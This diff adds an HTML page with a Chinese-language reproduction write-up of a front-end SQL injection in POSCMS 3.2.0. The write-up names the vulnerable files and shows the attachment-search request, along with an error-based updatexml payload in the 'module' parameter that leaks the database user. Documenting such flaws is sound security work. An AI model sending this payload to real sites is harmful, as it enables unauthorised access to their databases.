@@ -1,0 +1,32 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="poscms-320-前台sql注入漏洞"><span class="csDE05BCC">POSCMS 3.2.0 </span><span class="csECDA2D3">前台</span><span class="csDE05BCC">sql</span><span class="csECDA2D3">注入漏洞</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs8926E06">POSCMS 3.2.0</span></p><h2 class="cs868C439D">
+			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<p class="cs40DD2BC9"><span><img src="Web安全/POSCMS/POSCMS%203.2.0%20%e5%89%8d%e5%8f%b0sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="154" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">查看源码（</span><span class="cs9FB05234">\diy\dayrui\models\Attachment_model.php</span><span class="cs9C1B1871">）可以发现注入点：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/POSCMS/POSCMS%203.2.0%20%e5%89%8d%e5%8f%b0sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="241" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">该函数的调用点位于（</span><span class="cs9FB05234">\diy\module\member\controllers\Account.php</span><span class="cs9C1B1871">）：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/POSCMS/POSCMS%203.2.0%20%e5%89%8d%e5%8f%b0sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="233" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">对应的功能实际是前台用户中心</span><span class="cs8926E06">&mdash;&gt;</span><span class="cs9C1B1871">基本管理</span><span class="cs8926E06">&mdash;&gt;</span><span class="cs9C1B1871">附件管理的搜索功能，随便选择某个类别搜索后会看到这条请求：</span></p><p class="cs3A447A38"><span class="cs9FB05234">GET /index.php?s=member&amp;c=account&amp;m=attachment&amp;module=photo&amp;ext= HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">向</span><span class="cs9FB05234">module</span><span class="cs9C1B1871">参数注入</span><span class="cs8926E06">Payload</span><span class="cs9C1B1871">果然出现了报错：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/POSCMS/POSCMS%203.2.0%20%e5%89%8d%e5%8f%b0sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="166" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">但不知道为什么博客里的</span><span class="cs8926E06">Payload</span><span class="cs9C1B1871">这里复现失败了，不过已经知道是报错注入，我用了经典的</span><span class="cs8926E06">Payload&mdash;&mdash;</span><span class="cs9FB05234">&quot; or updatexml(1,concat(1,0x7e,user()),1);#</span><span class="cs9C1B1871">拼接入参数中，得到了数据库当前用户：</span></p><p class="cs3A447A38"><span class="cs9FB05234">GET /index.php?s=member&amp;c=account&amp;m=attachment&amp;module=photo%22%20or%20updatexml(1,concat(1,0x7e,user()),1);%23&amp;ext= HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org</span></p><p class="cs40DD2BC9"><span><img src="Web安全/POSCMS/POSCMS%203.2.0%20%e5%89%8d%e5%8f%b0sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="172" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
+			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
+		<p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/4858#toc-5</span></p></body>
+</html>
